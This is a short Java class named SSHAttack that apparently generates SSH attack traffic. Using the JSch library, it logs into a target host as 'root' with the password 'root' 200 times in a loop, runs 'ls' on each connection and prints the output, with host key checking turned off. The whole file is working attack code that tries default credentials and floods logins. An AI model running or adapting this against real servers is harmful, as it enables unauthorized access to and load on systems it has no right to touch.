package fr.contacgen;

import java.io.ByteArrayOutputStream;
import java.net.InetAddress;

import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class SSHAttack implements Runnable {
	private InetAddress server;
	private int amount = 200;

	public SSHAttack(InetAddress server) {
		this.server = server;
	}

    public static void execSSH(String username, String password, 
            String host, int port, String command) {
        Session session = null;
        ChannelExec channel = null;
        
        try {
            session = new JSch().getSession(username, host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setTimeout(30);
            session.connect();

            channel = (ChannelExec) session.openChannel("exec");
            channel.setCommand(command);
            ByteArrayOutputStream responseStream = new ByteArrayOutputStream();
            channel.setOutputStream(responseStream);
            channel.connect();
            
            while (channel.isConnected()) {
                Thread.sleep(10);
            }
            
            String responseString = new String(responseStream.toByteArray());
            System.out.println(responseString);
        } catch (JSchException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            if (session != null) {
                session.disconnect();
            }
            if (channel != null) {
                channel.disconnect();
            }
        }
    }

    @Override
    public void run() {
		while (amount > 0) {
			execSSH("root", "root", server.getHostName(), 22, "ls");
            amount--;
        }
    }
}
